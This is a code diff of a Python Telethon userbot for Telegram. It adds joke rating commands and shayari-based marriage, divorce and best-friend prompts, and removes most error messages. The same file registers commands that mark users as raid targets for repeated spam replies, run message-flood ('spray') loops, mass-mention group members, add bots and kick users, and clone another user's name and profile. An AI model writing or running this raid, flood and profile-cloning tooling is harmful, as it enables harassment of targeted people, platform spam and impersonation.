+                msg = f"🤗 **Friendliness Meter for {name}**\n\n😊 Friendly: {percent}%\n"
+                if percent >= 90:
+                    msg += "🌈 You're a ray of sunshine! ☀️"
+                elif percent >= 70:
+                    msg += "💖 Very approachable! 😊"
+                elif percent >= 50:
+                    msg += "😐 Pretty neutral!"
+                else:
+                    msg += "😤 Maybe need to smile more?"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("rizz")
+        async def cmd_rizz(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"💋 **Rizz Meter for {name}**\n\n🔥 Rizz Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "🌹 Absolute rizz god! 😏"
+                elif percent >= 70:
+                    msg += "💕 Smooth talker! 😉"
+                elif percent >= 50:
+                    msg += "😅 Average rizz!"
+                else:
+                    msg += "🤡 Need some rizz lessons? 😂"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("iq")
+        async def cmd_iq(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                score = random.randint(50, 200)
+                msg = f"🧠 **IQ Score for {name}**\n\n📊 IQ: {score}\n"
+                if score >= 180:
+                    msg += "🌟 Genius level! 🤯"
+                elif score >= 140:
+                    msg += "💡 Very smart! 🧐"
+                elif score >= 100:
+                    msg += "👍 Average, keep learning!"
+                else:
+                    msg += "😬 Maybe read a book? 😅"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        @register_cmd("stupidmeter")
+        async def cmd_stupidmeter(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"🤪 **Stupid Meter for {name}**\n\n🧠 Stupidity Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "🤡 Absolute clown! 😂"
+                elif percent >= 70:
+                    msg += "😬 Pretty dumb! 😅"
+                elif percent >= 50:
+                    msg += "🤷 Not too bright!"
+                else:
+                    msg += "🧠 Actually smart! 😎"
+                await safe_edit(event, msg)
+            except:
+                pass
+
+        # ─── BESTFRIEND, MARRIAGE, DIVORCE ───
+        @register_cmd("bestfrnd")
+        async def cmd_bestfrnd(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                requester = await user_bot.get_me()
+                requester_name = requester.first_name or "Someone"
+                target_user = await user_bot.get_entity(uid)
+                target_name = target_user.first_name or "Unknown"
+
+                shayari = random.choice(BESTFRIEND_SHAYARI)
+                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
                 buttons = [
                     [types.KeyboardButtonCallback("💖 Haan, zaroor!", f"bestfrnd_yes_{uid}_{event.sender_id}")],
                     [types.KeyboardButtonCallback("💔 Nahi, sorry!", f"bestfrnd_no_{uid}_{event.sender_id}")]
                 ]
                 await event.delete()
-                await user_bot.send_message(event.chat_id, f"🌸 {shayari}\n\n👤 **{name}**", buttons=buttons)
+                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
             except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("divorce")
-        async def cmd_divorce(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                shayari = f"💔 *Rishton ki dor hai kamzor,*\n🌪️ *Ab nahi sahega yeh dard-e-dil.*\n❓ *Kya tum talaq chahti ho/chahte ho?*"
-                buttons = [
-                    [types.KeyboardButtonCallback("💔 Yes", f"divorce_yes_{uid}_{event.sender_id}")],
-                    [types.KeyboardButtonCallback("💖 No, let's stay", f"divorce_no_{uid}_{event.sender_id}")]
-                ]
-                await event.delete()
-                await user_bot.send_message(event.chat_id, f"💔 {shayari}\n\n👤 **{name}**", buttons=buttons)
-            except:
-                await safe_edit(event, "❌ User not found.")
+                pass
 
         @register_cmd("marriage")
         async def cmd_marriage(event, arg):
             target = await get_targets(event, arg)
             if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
+                return
             uid = next(iter(target))
             try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                shayari = f"💍 *Chand sitare sab hai gawah,*\n🌹 *Tum bin jeena hai saza.*\n💕 *Kya tum mujhse shaadi karogi/karoge?*"
+                requester = await user_bot.get_me()
+                requester_name = requester.first_name or "Someone"
+                target_user = await user_bot.get_entity(uid)
+                target_name = target_user.first_name or "Unknown"
+
+                shayari = random.choice(MARRIAGE_SHAYARI)
+                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
                 buttons = [
                     [types.KeyboardButtonCallback("💍 Yes", f"marriage_yes_{uid}_{event.sender_id}")],
                     [types.KeyboardButtonCallback("💔 No", f"marriage_no_{uid}_{event.sender_id}")]
                 ]
                 await event.delete()
-                await user_bot.send_message(event.chat_id, f"💍 {shayari}\n\n👤 **{name}**", buttons=buttons)
+                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
             except:
-                await safe_edit(event, "❌ User not found.")
+                pass
 
-        # ─── REPLY, RR, FLAG, HRR, REPLYGOD, CUSTOMRAID ───
+        @register_cmd("divorce")
+        async def cmd_divorce(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return
+            uid = next(iter(target))
+            try:
+                requester = await user_bot.get_me()
+                requester_name = requester.first_name or "Someone"
+                target_user = await user_bot.get_entity(uid)
+                target_name = target_user.first_name or "Unknown"
+
+                shayari = random.choice(DIVORCE_SHAYARI)
+                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
+                buttons = [
+                    [types.KeyboardButtonCallback("💔 Yes", f"divorce_yes_{uid}_{event.sender_id}")],
+                    [types.KeyboardButtonCallback("💖 No, let's stay", f"divorce_no_{uid}_{event.sender_id}")]
+                ]
+                await event.delete()
+                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
+            except:
+                pass
+
+        @user_bot.on(events.CallbackQuery)
+        async def userbot_callback(event):
+            data = event.data.decode()
+            clicker_id = event.sender_id
+            parts = data.split("_")
+            if len(parts) < 4:
+                await event.answer("Invalid request.", alert=True)
+                return
+            action = parts[0]
+            target_id = int(parts[2])
+            requester_id = int(parts[3])
+            if clicker_id != target_id:
+                await event.answer("❌ This question is not for you!", alert=True)
+                return
+            try:
+                target = await user_bot.get_entity(target_id)
+                target_name = target.first_name or str(target_id)
+                requester = await user_bot.get_entity(requester_id)
+                requester_name = requester.first_name or str(requester_id)
+                if action == "bestfrnd_yes":
+                    await event.edit(f"💖 **{target_name}** said **YES** to be best friend with **{requester_name}**! 🎉\n\nDosti zindabad! 🤗")
+                    await event.answer("You accepted! 💖", alert=True)
+                elif action == "bestfrnd_no":
+                    await event.edit(f"💔 **{target_name}** said **NO** to be best friend with **{requester_name}**. 😢\n\nMaybe next time! 💔")
+                    await event.answer("You declined! 💔", alert=True)
+                elif action == "divorce_yes":
+                    await event.edit(f"💔 **{target_name}** said **YES** to divorce from **{requester_name}**. 😢\n\nIt's over. 💔")
+                    await event.answer("Divorce accepted! 💔", alert=True)
+                elif action == "divorce_no":
+                    await event.edit(f"💖 **{target_name}** said **NO** to divorce from **{requester_name}**. ❤️\n\nLove wins! 💕")
+                    await event.answer("Divorce rejected! ❤️", alert=True)
+                elif action == "marriage_yes":
+                    await event.edit(f"💍 **{target_name}** said **YES** to marry **{requester_name}**! 🎉\n\nCongratulations! 💕💍")
+                    await event.answer("Marriage accepted! 🎉", alert=True)
+                elif action == "marriage_no":
+                    await event.edit(f"💔 **{target_name}** said **NO** to marry **{requester_name}**. 😢\n\nMaybe next time! 💔")
+                    await event.answer("Marriage rejected! 💔", alert=True)
+            except Exception as e:
+                await event.edit("❌ Error processing your request.")
+                print(f"Callback error: {e}")
+
+        # ─── RAID COMMANDS ───
         @register_cmd("reply", needs_reply=True)
         async def cmd_reply(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.reply_users:
@@ -1755,7 +2011,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_rr(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.rr_users:
@@ -1791,7 +2047,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_flag(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.flag_users:
@@ -1827,7 +2083,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_hrr(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.hrr_users:
@@ -1863,7 +2119,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_replygod(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.replygod_users:
@@ -1898,17 +2154,17 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("customraid", needs_reply=True)
         async def cmd_customraid(event, arg):
             if not arg or len(arg.split()) < 2:
-                return await safe_edit(event, "❌ Usage: .customraid <text> <count> (reply to user)")
+                return
             text, count = arg.rsplit(" ", 1)
             try:
                 count = int(count)
                 if count < 1: count = 1
                 if count > 100: count = 100
             except:
-                return await safe_edit(event, "❌ Count must be a number")
+                return
             targets = await get_targets(event, "")
             if not targets:
-                return await safe_edit(event, "❌ No target (reply to user or mention)")
+                return
             added, overridden = [], []
             for uid in targets:
                 if uid in user_bot.custom_raid_users:
@@ -1944,10 +2200,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("spray")
         async def cmd_spray(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .spray <text>")
+                return
             chat = event.chat_id
             if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
-                return await safe_edit(event, "⚠️ Already spraying")
+                return
             await safe_edit(event, "⚡ Spray starting...")
             async def loop():
                 sent = 0
@@ -1969,7 +2225,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_dspray(event, _):
             chat = event.chat_id
             if chat not in user_bot.spray_tasks:
-                return await safe_edit(event, "⚠️ No active spray")
+                return
             try:
                 user_bot.spray_tasks[chat].cancel()
             except:
@@ -1991,51 +2247,45 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("addtext")
         async def cmd_addtext(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             if not arg:
-                return await safe_edit(event, "❌ Usage: .addtext <text>")
+                return
             user_bot.spam_texts.append(arg.strip())
             save_common_spam()
-            await safe_edit(event, f"✅ Text added! Slot `{len(user_bot.spam_texts)}`")
 
         @register_cmd("edittext")
         async def cmd_edittext(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             parts = arg.split(None, 1) if arg else []
             if len(parts) < 2 or not parts[0].isdigit():
-                return await safe_edit(event, "❌ Usage: .edittext <number> <new text>")
+                return
             idx = int(parts[0]) - 1
             if idx < 0 or idx >= len(user_bot.spam_texts):
-                return await safe_edit(event, f"❌ Invalid slot. Total: {len(user_bot.spam_texts)}")
-            old = user_bot.spam_texts[idx]
+                return
             user_bot.spam_texts[idx] = parts[1]
             save_common_spam()
-            await safe_edit(event, f"✏️ Edited slot {idx+1}:\n`{old}` → `{parts[1]}`")
 
         @register_cmd("deltext")
         async def cmd_deltext(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             if not arg or not arg.isdigit():
-                return await safe_edit(event, "❌ Usage: .deltext <number>")
+                return
             idx = int(arg) - 1
             if idx < 0 or idx >= len(user_bot.spam_texts):
-                return await safe_edit(event, f"❌ Invalid slot. Total: {len(user_bot.spam_texts)}")
-            removed = user_bot.spam_texts.pop(idx)
+                return
+            user_bot.spam_texts.pop(idx)
             save_common_spam()
-            await safe_edit(event, f"🗑️ Deleted slot {idx+1}: `{removed[:40]}`")
 
         @register_cmd("cleartext")
         async def cmd_cleartext(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             if arg.strip().lower() != "confirm":
-                return await safe_edit(event, f"⚠️ Type `.cleartext confirm` to delete all {len(user_bot.spam_texts)} texts.")
-            count = len(user_bot.spam_texts)
+                return
             user_bot.spam_texts.clear()
             save_common_spam()
-            await safe_edit(event, f"🗑️ Cleared {count} texts.")
 
         @register_cmd("tspray")
         async def cmd_tspray(event, arg):
@@ -2170,9 +2420,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("spraydelay")
         async def cmd_spraydelay(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             if not arg:
-                return await safe_edit(event, f"Current delay: {user_bot.SPRAY_DELAY}s")
+                await safe_edit(event, f"Current delay: {user_bot.SPRAY_DELAY}s")
+                return
             try:
                 val = float(arg)
                 if val < 0.1: val = 0.1
@@ -2188,7 +2439,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_mute(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.muted_users:
@@ -2205,7 +2456,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_unmute(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             removed, not_muted = [], []
             for uid in targets:
                 if uid in user_bot.muted_users:
@@ -2222,7 +2473,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_gmute(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already = [], []
             for uid in targets:
                 if uid in user_bot.global_muted:
@@ -2239,7 +2490,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_gunmute(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             removed, not_muted = [], []
             for uid in targets:
                 if uid in user_bot.global_muted:
@@ -2296,11 +2547,11 @@ async def run_user_bot(session_string, chat_id):
             try:
                 perms = await user_bot.get_permissions(chat, 'me')
                 if not perms.is_admin:
-                    return await safe_edit(event, "❌ Need admin rights")
+                    return
             except:
                 pass
             if chat in user_bot.group_locks:
-                return await safe_edit(event, "⚠️ Already locked")
+                return
             user_bot.group_locks.add(chat)
             await safe_edit(event, "🔒 Group locked")
 
@@ -2308,7 +2559,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_unlock(event, _):
             chat = event.chat_id
             if chat not in user_bot.group_locks:
-                return await safe_edit(event, "⚠️ Not locked")
+                return
             user_bot.group_locks.discard(chat)
             await safe_edit(event, "🔓 Group unlocked")
 
@@ -2324,7 +2575,7 @@ async def run_user_bot(session_string, chat_id):
             async for m in user_bot.iter_messages(event.chat_id, limit=count+1):
                 msgs.append(m.id)
             if not msgs:
-                return await safe_edit(event, "⚠️ No messages")
+                return
             try:
                 await user_bot.delete_messages(event.chat_id, msgs)
             except FloodWaitError as fw:
@@ -2336,13 +2587,13 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_throw(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             try:
                 perms = await user_bot.get_permissions(event.chat_id, 'me')
                 if not perms.is_admin:
-                    return await safe_edit(event, "❌ Need admin rights")
+                    return
             except:
-                return await safe_edit(event, "❌ Permission check failed")
+                return
             kicked, failed, skipped = [], [], []
             me2 = await user_bot.get_me()
             for uid in targets:
@@ -2363,16 +2614,16 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("addbots", group_only=True)
         async def cmd_addbots(event, arg):
             if not arg or not arg.isdigit():
-                return await safe_edit(event, "❌ Usage: .addbots <count>")
+                return
             limit = int(arg)
             if limit < 1: limit = 1
             if limit > len(user_bot.ADD_BOTS_LIST): limit = len(user_bot.ADD_BOTS_LIST)
             try:
                 perms = await user_bot.get_permissions(event.chat_id, 'me')
                 if not perms.is_admin:
-                    return await safe_edit(event, "❌ Need admin rights")
+                    return
             except:
-                return await safe_edit(event, "❌ Permission check failed")
+                return
             chat = event.chat_id
             status = await safe_edit(event, f"🔄 Adding {limit} bots...")
             added, already, failed = 0, 0, 0
@@ -2404,9 +2655,9 @@ async def run_user_bot(session_string, chat_id):
             try:
                 perms = await user_bot.get_permissions(chat, 'me')
                 if not perms.is_admin:
-                    return await safe_edit(event, "❌ Need admin rights")
+                    return
             except:
-                return await safe_edit(event, "❌ Permission check failed")
+                return
             msg = arg.strip() if arg else "Hey everyone! 🎉"
             await safe_edit(event, "⏳ Fetching members...")
             try:
@@ -2525,7 +2776,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("ar")
         async def cmd_ar(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .ar <emoji>")
+                return
             user_bot.auto_react_emoji = arg.strip()
             await safe_edit(event, f"✅ Auto-react set to {arg}")
 
@@ -2538,7 +2789,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_react(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             emoji = None
             if arg:
                 parts = arg.strip().split()
@@ -2547,7 +2798,7 @@ async def run_user_bot(session_string, chat_id):
             if not emoji:
                 emoji = user_bot.auto_react_emoji
                 if not emoji:
-                    return await safe_edit(event, "❌ Set global emoji first with .ar or pass emoji in command")
+                    return
             added, updated, skipped = [], [], []
             for uid in targets:
                 if uid in OWNER_IDS:
@@ -2571,7 +2822,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_unreact(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             removed, not_found, skipped = [], [], []
             for uid in targets:
                 if uid in OWNER_IDS:
@@ -2606,7 +2857,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("notesadd")
         async def notes_add(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Give note text")
+                return
             nid = max(user_bot.notes.keys(), default=0) + 1
             user_bot.notes[nid] = arg[:4000]
             save_notes()
@@ -2624,10 +2875,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("notesdelete")
         async def notes_delete(event, arg):
             if not arg or not arg.isdigit():
-                return await safe_edit(event, "❌ Give ID")
+                return
             nid = int(arg)
             if nid not in user_bot.notes:
-                return await safe_edit(event, "⚠️ Note not found")
+                return
             del user_bot.notes[nid]
             save_notes()
             await safe_edit(event, f"🗑️ Note {nid} deleted")
@@ -2636,7 +2887,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("tts")
         async def cmd_tts(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .tts <text> [lang]")
+                return
             parts = arg.split(maxsplit=1)
             lang = "hi"
             text = arg
@@ -2666,7 +2917,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("qrcode")
         async def cmd_qrcode(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .qrcode <text>")
+                return
             await safe_edit(event, "⚡ Generating QR...")
             fname = f"qr_{int(time.time())}.png"
             qrcode.make(arg[:3000]).save(fname)
@@ -2683,7 +2934,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("fancy")
         async def cmd_fancy(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .fancy <text>")
+                return
             t = arg[:2000]
             styles = [
                 t.upper(), t.lower(),
@@ -2700,7 +2951,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("style")
         async def cmd_style(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .style <text>")
+                return
             t = arg[:2000]
             fancy = t.replace('a','𝒶').replace('b','𝒷').replace('c','𝒸').replace('d','𝒹').replace('e','𝑒').replace('f','𝒻').replace('g','𝑔').replace('h','𝒽').replace('i','𝒾').replace('j','𝒿').replace('k','𝓀').replace('l','𝓁').replace('m','𝓂').replace('n','𝓃').replace('o','𝑜').replace('p','𝓅').replace('q','𝓆').replace('r','𝓇').replace('s','𝓈').replace('t','𝓉').replace('u','𝓊').replace('v','𝓋').replace('w','𝓌').replace('x','𝓍').replace('y','𝓎').replace('z','𝓏')
             await safe_edit(event, f"🎨 Style\n━━━━━━━━━━━━━━━\n𝒇𝒂𝒏𝒄ʏ → {fancy}\n**Bold** → **{t}**\n__Italic__ → __{t}__\n`Mono` → `{t}`")
@@ -2708,7 +2959,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("emoji")
         async def cmd_emoji(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .emoji <text>")
+                return
             pool = ["🔥","❤️","✨","⚡","💥","🌟","💫","🎯","💎","🦋","🌈","🧨","🎆","👑","🌸","🪄","🌊","❄️","🍁","🌙","☀️","💣","🎵","🧿"]
             emojis = "".join(random.choice(pool) for _ in range(8))
             await safe_edit(event, f"😀 Emoji Style\n━━━━━━━━━━━━━━━\n{arg[:2000]} {emojis}")
@@ -2716,10 +2967,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("calc")
         async def cmd_calc(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .calc <expression>")
+                return
             expr = arg.replace(" ", "")
             if any(c not in "0123456789+-*/().%" for c in expr):
-                return await safe_edit(event, "❌ Invalid chars")
+                return
             try:
                 res = eval(expr, {"__builtins__": None}, {})
                 await safe_edit(event, f"🧮 Calculator\n━━━━━━━━━━━━━━━\n{expr} = {res}")
@@ -2729,7 +2980,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("weather")
         async def cmd_weather(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Give city")
+                return
             await safe_edit(event, "⚡ Fetching weather...")
             try:
                 geo = requests.get(f"https://geocoding-api.open-meteo.com/v1/search?name={arg}&count=1", timeout=8).json()
@@ -2748,7 +2999,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("ip")
         async def cmd_ip(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Give IP")
+                return
             try:
                 data = requests.get(f"http://ip-api.com/json/{arg}", timeout=8).json()
                 if data.get("status") != "success":
@@ -2760,7 +3011,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("short")
         async def cmd_short(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Give URL")
+                return
             if not arg.startswith(("http://", "https://")):
                 arg = "http://" + arg
             try:
@@ -2781,14 +3032,14 @@ async def run_user_bot(session_string, chat_id):
                     ent = await user_bot.get_entity(arg)
                     target = ent.id
                 except:
-                    return await safe_edit(event, "❌ Invalid user")
+                    return
             if not target:
-                return await safe_edit(event, "⚠️ Reply or pass user")
+                return
             await safe_edit(event, "⚡ Fetching user info...")
             try:
                 user = await user_bot.get_entity(target)
                 if user.id in OWNER_IDS:
-                    return await safe_edit(event, "🔒 Owner private")
+                    return
                 full = await user_bot(functions.users.GetFullUserRequest(user.id))
                 bio = full.full_user.about or "No Bio"
                 uname = f"@{user.username}" if user.username else "No User"
@@ -2813,7 +3064,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("music")
         async def cmd_music(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .music <song>")
+                return
             query = arg.strip()
             frames = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"]
             status = await safe_edit(event, f"🎵 Processing `{query}`\n\n{frames[0]}")
@@ -2878,7 +3129,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("dmusic")
         async def cmd_dmusic(event, arg):
             if not arg:
-                return await safe_edit(event, "❌ Usage: .dmusic <song>")
+                return
             query = arg.strip()
             frames = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"]
             status = await safe_edit(event, f"📥 Downloading `{query}`\n\n{frames[0]}")
@@ -2952,7 +3203,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_shayariraid(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             count = None
             if arg:
                 parts = arg.strip().split()
@@ -2961,7 +3212,7 @@ async def run_user_bot(session_string, chat_id):
                     if count < 1: count = 1
                     if count > 100: count = 100
             if not shayari_texts:
-                return await safe_edit(event, "❌ Shayari list empty")
+                return
             added = []
             for uid in targets:
                 user_bot.shayari_raid[uid] = count
@@ -2998,7 +3249,7 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_rizzraid(event, arg):
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             count = None
             if arg:
                 parts = arg.strip().split()
@@ -3007,7 +3258,7 @@ async def run_user_bot(session_string, chat_id):
                     if count < 1: count = 1
                     if count > 100: count = 100
             if not rizz_texts:
-                return await safe_edit(event, "❌ Rizz list empty")
+                return
             added = []
             for uid in targets:
                 user_bot.rizz_raid[uid] = count
@@ -3044,10 +3295,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("addadmin", needs_reply=True)
         async def cmd_addadmin(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             added, already, skipped = [], [], []
             for uid in targets:
                 if uid in OWNER_IDS:
@@ -3067,10 +3318,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("deladmin", needs_reply=True)
         async def cmd_deladmin(event, arg):
             if event.sender_id not in OWNER_IDS:
-                return await safe_edit(event, "❌ Owner only command.")
+                return
             targets = await get_targets(event, arg)
             if not targets:
-                return await safe_edit(event, "❌ No target")
+                return
             removed, not_admin, skipped = [], [], []
             for uid in targets:
                 if uid in OWNER_IDS:
@@ -3131,7 +3382,7 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("copy")
         async def cmd_copy(event, args):
             if not is_admin(event.sender_id):
-                return await safe_edit(event, "❌ Only admins can use this command.")
+                return
             reply = await event.get_reply_message()
             target = None
             if reply:
@@ -3153,12 +3404,12 @@ async def run_user_bot(session_string, chat_id):
                 except:
                     pass
             if not target:
-                return await safe_edit(event, "❌ Reply / user / ID")
+                return
             me2 = await user_bot.get_me()
             if target.id == me2.id:
-                return await safe_edit(event, "⚠️ Self clone blocked")
+                return
             if user_bot.CLONE_ACTIVE and user_bot.LAST_CLONE_ID == target.id:
-                return await safe_edit(event, "⚠️ Already cloned")
+                return
             await safe_edit(event, "⚡ Clone Init...")
             if not user_bot.CLONE_ACTIVE:
                 try:
@@ -3202,9 +3453,9 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("normal")
         async def cmd_normal(event, _):
             if not is_admin(event.sender_id):
-                return await safe_edit(event, "❌ Only admins can use this command.")
+                return
             if not user_bot.CLONE_ACTIVE:
-                return await safe_edit(event, "⚠️ No clone active")
+                return
             try:
                 await safe_edit(event, "⚡ Restoring...")
                 await user_bot(functions.account.UpdateProfileRequest(first_name=user_bot.CLONE_DATA.get("name") or "", last_name=user_bot.CLONE_DATA.get("last") or ""))
@@ -3229,10 +3480,10 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("banner", needs_reply=True)
         async def cmd_banner(event, _):
             if not is_admin(event.sender_id):
-                return await safe_edit(event, "❌ Only admins can use this command.")
+                return
             reply = await event.get_reply_message()
             if not reply or not reply.media:
-                return await safe_edit(event, "❌ Reply to photo/video")
+                return
             await safe_edit(event, "⚡ Processing banner...")
             try:
                 try:
@@ -3240,7 +3491,7 @@ async def run_user_bot(session_string, chat_id):
                 except:
                     file = await reply.download_media(file=bytes)
                     if not file:
-                        return await safe_edit(event, "❌ Download fail")
+                        return
                     bio = BytesIO(file)
                     bio.name = "banner"
                     saved = await user_bot.send_file("me", bio)
@@ -3253,9 +3504,9 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("rembanner")
         async def cmd_rembanner(event, _):
             if not is_admin(event.sender_id):
-                return await safe_edit(event, "❌ Only admins can use this command.")
+                return
             if not user_bot.menu_banner_msg:
-                return await safe_edit(event, "⚠️ No banner")
+                return
             try:
                 chat_id2, msg_id = user_bot.menu_banner_msg
                 try:
@@ -3271,37 +3522,32 @@ async def run_user_bot(session_string, chat_id):
         @register_cmd("nc")
         async def cmd_nc(event, arg):
             if not is_admin(event.sender_id):
-                return await safe_edit(event, "❌ Only admins can use this command.")
+                return
             if not arg:
-                return await safe_edit(event, "❌ Usage: .nc set <lang> <text>  or  .nc stop")
+                return
             parts = arg.strip().split(maxsplit=2)
             if len(parts) < 2:
-                return await safe_edit(event, "❌ Invalid. Use: .nc set <lang> <text>  or  .nc stop")
+                return
             action = parts[0].lower()
             if action == "stop":
-                # Saare active userbots ka NC stop karo (Global fix)
-                stopped_count = 0
-                for uid, ub in active_userbots.items():
-                    if hasattr(ub, "NC_STATE"):
-                        ub.NC_STATE["active"] = False
-                        if ub.NC_STATE.get("task") and not ub.NC_STATE["task"].done():
-                            ub.NC_STATE["task"].cancel()
-                            try:
-                                await ub.NC_STATE["task"]
-                            except asyncio.CancelledError:
-                                pass
